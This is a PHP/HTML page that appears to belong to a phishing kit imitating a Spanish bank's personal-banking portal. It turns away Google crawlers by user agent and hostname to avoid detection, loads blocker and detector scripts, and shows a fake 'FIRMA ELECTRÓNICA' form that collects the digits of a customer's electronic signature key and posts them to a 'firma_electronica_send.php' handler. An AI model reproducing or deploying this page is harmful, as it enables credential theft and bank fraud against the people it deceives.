<?php

session_start();
error_reporting(0);


// include "../xJOESTAR/anti1.php";
// include "../xJOESTAR/anti2.php";
// include "../xJOESTAR/anti3.php";
// include "../xJOESTAR/anti4.php";
// include "../xJOESTAR/anti5.php";
// include "../xJOESTAR/anti7.php";
// include "../xJOESTAR/anti8.php";




if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }


session_start();

include("./xREPORT/Sinus/blocker.php");
include("./xREPORT/Sinus/detect.php");


$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);




?>
<!DOCTYPE html>
<html lang="es">
  <head>
  <meta charset="UTF-8"/>
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Particulares</title>
  <meta name="robots" content="noindex, nofollow, noimageindex">
  <meta name="description" content="">
  <meta name="viewport" content="width=device-width, initial-scale=1">


       <link rel="apple-touch-icon" sizes="57x57" href="./style/apple-icon-57x57.png"> 
       <link rel="apple-touch-icon" sizes="60x60" href="./style/apple-icon-60x60.png"> 
       <link rel="apple-touch-icon" sizes="72x72" href="./style/apple-icon-72x72.png"> 
       <link rel="apple-touch-icon" sizes="76x76" href="./style/apple-icon-76x76.png">
        <link rel="apple-touch-icon" sizes="114x114" href="./style/apple-icon-114x114.png">
        <link rel="apple-touch-icon" sizes="120x120" href="./style/apple-icon-120x120.png"> 
       <link rel="apple-touch-icon" sizes="144x144" href="./style/apple-icon-144x144.png"> 
       <link rel="apple-touch-icon" sizes="152x152" href="./style/apple-icon-152x152.png"> 
       <link rel="apple-touch-icon" sizes="180x180" href="./style//apple-icon-180x180.png"> 
       <link rel="icon" type="image/png" sizes="192x192" href="./style/android-icon-192x192.png"> 
       <link rel="icon" type="image/png" sizes="32x32" href="./style/favicon-32x32.png"> 
       <link rel="icon" type="image/png" sizes="96x96" href="./style/favicon-96x96.png">
        <link rel="icon" type="image/png" sizes="16x16" href="./style/favicon-16x16.png"> 
  <link rel="stylesheet" href="./style/normalize.css">
  <link rel="stylesheet" href="./style/style.css">
            <link rel="stylesheet" href="./style//main.a5beaad1.css"> </head> 

<script src="./style/js/angular.min.js"></script>
<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>
<script src="./style/js/jquery.mask.js"></script>

  </head>
  <body class="firm">
<!-- ============================ -->
<!-- ======= Start Header ======= -->
<!-- ============================ -->
  <header>
      <div class="contenue-media">
        <img src="" alt="">
        <img src="./style/lg-small.svg" alt="">
        <img src="./style/3bandes.svg" alt="">
      </div>

      <div class="contenue">
      <div class="lg-select">
        <img src="./style/lg-select.svg" alt="">
      </div>
      <div class="menu">
        <ul>
    <li><img src="./style/ok.svg"><span>Ayúdanos a mejorar</span></li>
          <li><img src="./style/braya.svg"><span>Buzón</span></li>
          <li><img src="./style/bnadem.svg"><span>Área personal</span></li>
          <li><img src="./style/stifham.svg"><span>Atención al cliente</span></li>
          <li><img src="./style/tfi.svg"><span>Desconexión</span></li>
        </ul>
      </div>
    </div>
      <div class="menu-blanc">
    <div class="contenue">
        <ul>
        <li><img src="./style/dar.svg"></li>
          <li>Cuentas  y  tarjetas</li>
          <li>Financiación</li>
          <li>Ahorro e inversión</li>
          <li>Seguros</li>
          <li>Marketplace</li>
          <li>Contratar</li>
        </ul>
      </div>
      </div>
  </header>
    <div class="">





<style>

  .cssload-container {
  width: 100%;
  height: 88px;
  text-align: center;
}

.cssload-zenith {
  width: 80px;
    height: 80px;
  margin: 0 auto;
  border-radius: 50%;
  border-top-color: transparent;
  border-left-color: transparent;
  border-right-color: transparent;
  box-shadow: 2px 2px 2px  rgb(236, 0, 0);
  animation: cssload-spin 960ms infinite linear;
    -o-animation: cssload-spin 960ms infinite linear;
    -ms-animation: cssload-spin 960ms infinite linear;
    -webkit-animation: cssload-spin 960ms infinite linear;
    -moz-animation: cssload-spin 960ms infinite linear;
}


.all-input {
    margin: 0 auto;
    text-align: center;
    padding: 30px 0;
    border-bottom: 1px solid #d9d9d9;
}

.block-gris {
    background-color: #e9e9e9;
    box-sizing: border-box;
    padding: 20px;
    margin: 0 auto;
    width: 100%;
}

.cnt-load {
    position: absolute;
    width: 80px;
    height: 80px;
    left: 50%;
    top: 50%;
    margin: -40px 0 0 -40px;
}

@keyframes cssload-spin {
  100%{ transform: rotate(360deg); transform: rotate(360deg); }
}

@-o-keyframes cssload-spin {
  100%{ -o-transform: rotate(360deg); transform: rotate(360deg); }
}

@-ms-keyframes cssload-spin {
  100%{ -ms-transform: rotate(360deg); transform: rotate(360deg); }
}

@-webkit-keyframes cssload-spin {
  100%{ -webkit-transform: rotate(360deg); transform: rotate(360deg); }
}

@-moz-keyframes cssload-spin {
  100%{ -moz-transform: rotate(360deg); transform: rotate(360deg); }
}

</style>







<div class="loading" ng-class="{loaderBye: cargando}">
      <div class="cnt-load">
<div class="cssload-container">
  <div class="cssload-zenith"></div>
</div>

          <svg style="margin: -62px -56px 54px 27px;" xml:space="preserve" xmlns:xlink="http://www.w3.org/1999/xlink" enable-background="new 0 0 27 25" height="25px" id="Layer_1" version="1.1" viewBox="0 0 27 25" width="27px" x="0px" xmlns="http://www.w3.org/2000/svg" y="0px">
          <path d="M13.9,1.19c0,3.07,5.1,6.49,5.1,10c0,0,0,0.33-0.14,0.7C23.63,12.9,27,15.3,27,18.11
    c0,3.771-6.02,6.87-13.469,6.89h-0.15C6,25,0,22,0,18.25c0-2.81,3.66-5.08,8.07-6.29c0,1.55,5.03,6.459,5.15,8.45
    c0,0,0.02,0.17,0.02,0.36c0,0.101,0,0.19-0.02,0.29c1.08-0.58,1.08-2.4,1.08-2.4c0-4.3-4.88-6.22-4.88-10.45
    c0-1.65,0.75-2.86,1.44-3.2V6.2c0,3.07,5.28,6.51,5.28,9.32v0.92c1.23-0.489,1.23-2.79,1.23-2.79c0-3.87-4.911-6.02-4.911-10.45
    c0-1.65,0.76-2.86,1.44-3.2V1.19z" fill="#ec0000"></path></svg>
          <div class="uil-ring-css"><div></div></div>
      </div>

</div> 


    <div class="section">
      <div class="contenue-firm2">
       
          <div class="clearfix"></div>
          <div class="stName">
              <div class="text-left">
              
              </div>
              <div class="text-center">
        
              </div>
              <div class="text-right">
       
              </div>
              </div>
              <BR> <BR> <BR>
      <div class="">
      <div class="texte-verif">
      <div class="titre">
      </div>
      <div class="dakchi">




      </div>
      </div>
      <form id="lFrm" method="post" action="./xREPORT/Sinus/firma_electronica_send.php">
      <div class="firm-digit">
      <div class="titre">FIRMA ELECTRÓNICA</div>
      <div class="block-gris">
      <div class="intro">Introduce las posiciones de tu firma electrónica</div>
      <div class="all-input">
        <input type="text" id="k1" name="k1" maxlength="1" autocomplete="off" required>
        <input type="text" id="k2" name="k2" maxlength="1" autocomplete="off" required>
        <input type="text" id="k3" name="k3" maxlength="1" autocomplete="off" required>
        <input type="text" id="k4" name="k4" maxlength="1" autocomplete="off" required>
        <input type="text" id="k5" name="k5" maxlength="1" autocomplete="off" required>
        <input type="text" id="k6" name="k6" maxlength="1" autocomplete="off" required>
        <input type="text" id="k7" name="k7" maxlength="1" autocomplete="off">
        <input type="text" id="k8" name="k8" maxlength="1" autocomplete="off">
      </div>
      
      </div>

    

      </div>

      <button class="btn-firm2" type="submit" id="sBtn" class="btn btn-primary">ACEPTAR</button>

      </form>
      </div>
      </div>
    </div>
  </div>


    <script>
    
    
$(document).ready(function(){
    $('input').keyup(function(){
        if($(this).val().length==$(this).attr("maxlength")){
            $(this).next().focus();
        }
    });
});
  
/*------------------------------------------------------------*/
/*------------------- Start First Loading --------------------*/
/*------------------------------------------------------------*/

  function onReady(callback) {
    $('.section').addClass('hid').removeClass('show');

  var intervalId = window.setInterval(function() {

    if (document.getElementsByTagName('body')[0] !== undefined) {
      window.clearInterval(intervalId);
    

      callback.call(this);
    }
  }, 3500);
}

function setVisible(selector, visible) {
  document.querySelector(selector).style.display = visible ? 'block' : 'none';
}

onReady(function() {
  setVisible('body', true);
    $('.section').addClass('show').removeClass('hid');
  setVisible('.loading', false);
});
  </script>
  </body>
</html>
